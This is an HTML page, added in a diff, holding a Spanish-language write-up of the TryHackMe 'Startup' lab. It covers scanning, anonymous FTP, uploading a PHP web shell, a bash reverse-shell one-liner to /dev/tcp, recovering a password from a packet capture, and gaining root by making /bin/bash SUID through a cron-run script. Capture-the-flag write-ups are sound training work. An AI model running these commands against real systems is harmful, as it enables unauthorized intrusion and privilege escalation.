@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Machine Startup | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../../../index.html#writeups" class="nav-link">← Writeups</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../../../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <div class="writeup-meta">
+        <span class="card-badge thm">THM</span>
+        <span class="card-difficulty easy">EASY</span>
+      </div>
+      <h1 class="writeup-title">Machine Startup</h1>
+      <div class="writeup-info">
+        <span>Plataforma: <strong style="color:var(--blue-bright)">TryHackMe</strong></span>
+        <span>Tags: <span>FTP</span><span>Web</span><span>Linux</span></span>
+      </div>
+    </div>
+    <div class="writeup-body">
+
+<h2>Enumeración Inicial </h2>
+
+<p>enumeramos puertos abiertos con nmap. comando:</p>
+<code>nmap -sS -p- --open --min-rate 5000 -Pn -n <IP> -oN nmap.txt</code>
+
+<em>[imagen]</em>
+
+<p>ahoral lanzamos otro escaneo para saber versiones de servicios con el parametro <code>-sV</code> y con <code>sC</code> para escanear vulnerabilidades comunes de estos servicios. comando:</p>
+<code>namp -sVC -p21,22,80 <ip> -oN namp2.txt</code> 
+
+<em>[imagen]</em>
+<p>vemos que FTP permite logearse como anonymous, por lo tanto vamos a enumerarlo.</p>
+
+
+<hr>
+
+<h2>Enumeración FTP</h2>
+
+<p>Nos logeamos con las credenciales Anonymous y listamos recursos FTP</p>
+
+<em>[imagen]</em>
+<p>hacemos un <code>get</code> a todos estos archivos para ver que contienen y no había nada interesante.</p>
+
+
+<hr>
+
+<h2>Enumeración Web </h2>
+
+
+<em>[imagen]</em>
+
+<p>Esta es la web</p>
+
+<em>[imagen]</em>
+
+
+<p>Ahora vamos a aplicar fuzzing web para descubrir directorios/recursos del servidor web</p>
+
+<h3>Fuzzing Web </h3>
+
+<p>comando aplicado:</p>
+<code>gobuster dir -u http://10.10.148.144 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt </code>
+
+<em>[imagen]</em>
+<p>encontramos un directorio <code>/files</code> que a primera vista tienes los mismos documentos servidos por FTP.</p>
+
+<p>Viendo que estan los mismos archivos que en FTP y que podemos subir archivos por FTP , se me ocurrio subir una web shell via FTP y ejecutarla en la web.</p>
+
+<p>primero subimos este archivo PHP para ver si todo esto funcionara.</p>
+<em>[imagen]</em>
+<p>con este archivo , system() ejecutara todo lo que reciba la web con el parametro <em>cmd</em></p>
+
+<em>[imagen]</em>
+<p>y sirve, ahora obtenemos una revere shell poniendo <code>bash -c 'bash -i >& /dev/tcp/ip/puerto 0>&1'</code> en el parámetro <em>cmd</em></p>
+
+<em>[imagen]</em>
+
+<hr>
+
+<h1>Escalada de privilegios </h1>
+
+<h3>Enumeramos usuarios</h3>
+
+<p>comando: <code>cat /etc/passwd | grep home</code></p>
+
+<em>[imagen]</em>
+
+<hr>
+
+<p>navegando vemos que hay una carpeta incidents con una captura wireshark que exfiltramos a nuestra maquina para inspeccionar</p>
+
+<p>Analizando vemos que alguien establecio una reverseshell antes</p>
+
+<em>[imagen]</em>
+
+<p>Luego de la captura de estos paquetes , los otros paquetes son comandos enviamos por el atacante y sus stdout, y analizamos eso.</p>
+
+<p>Viendo todo eso registramos la ejecucion del comando <code>sudo -l</code> y el posterior envio de la password de <code>www-data</code> :</p>
+
+<pre><code>0000   00 00 03 04 00 06 00 00 00 00 00 00 20 57 08 00   ............ W..
+<p>0010   45 00 00 3d 25 07 40 00 40 06 67 4d c0 a8 16 8b   E..=%.@.@.gM....</p>
+<p>0020   c0 a8 16 8b 9f e6 11 5c 2f 35 b2 55 bf 7f c7 df   .......\/5.U....</p>
+<p>0030   80 18 00 40 ae 96 00 00 01 01 08 0a 2a f4 3f fb   ...@........*.?.</p>
+<p>0040   2a f4 3f f8 73 75 64 6f 20 2d 6c 0d 0a            *.?.sudo -l..</code></pre></p>
+
+<pre><code>0000   00 00 03 04 00 06 00 00 00 00 00 00 00 00 08 00   ................
+<p>0010   45 00 00 52 25 08 40 00 40 06 67 37 c0 a8 16 8b   E..R%.@.@.g7....</p>
+<p>0020   c0 a8 16 8b 9f e6 11 5c 2f 35 b2 5e bf 7f c7 df   .......\/5.^....</p>
+<p>0030   80 18 00 40 ae ab 00 00 01 01 08 0a 2a f4 40 09   ...@........*.@.</p>
+<p>0040   2a f4 3f fb 5b 73 75 64 6f 5d 20 70 61 73 73 77   *.?.[sudo] passw</p>
+<p>0050   6f 72 64 20 66 6f 72 20 77 77 77 2d 64 61 74 61   ord for www-data</p>
+<p>0060   3a 20                                             :</code></pre></p>
+
+<pre><code>0000   00 00 03 04 00 06 00 00 00 00 00 00 04 06 08 00   ................
+<p>0010   45 00 00 47 02 7f 40 00 40 06 89 cb c0 a8 16 8b   E..G..@.@.......</p>
+<p>0020   c0 a8 16 8b 11 5c 9f e6 bf 7f c7 df 2f 35 b2 7c   .....\....../5.|</p>
+<p>0030   80 18 00 40 ae a0 00 00 01 01 08 0a 2a f4 4a 0e   ...@........*.J.</p>
+<p>0040   2a f4 40 09 63 34 6e 74 67 33 74 33 6e 30 75 67   *.@.c4ntg3t3n0ug</p>
+<p>0050   68 73 70 31 63 33 0a                              hsp1c3.</code></pre></p>
+
+<hr>
+<p>Ahora con esto podemos hacer un <code>su lennie</code> y escalar privilegios desde ese user</p>
+
+
+<p>Corremos pspy para ver los procesos corriendo en el sistema y vemos que root ejecuta cada min un scritp planner.sh, al cual no tenemos permisos de escritura</p>
+
+<em>[imagen]</em>
+
+<p>pero vemos que a su vez ese script , ejecuta otro script al cual si tenemos permisos de escritura</p>
+
+<em>[imagen]</em>
+
+<p>Cambiamos el contenido del script print.sh para otorgue permisos SUID al binario bash, para luego nosotros ejecutarlo y que nos de una bash como root</p>
+
+<pre><code>chmod u+s /bin/bash</code></pre>
+
+<em>[imagen]</em>
+
+
+    </div>
+  </div>
+</body>
+</html>
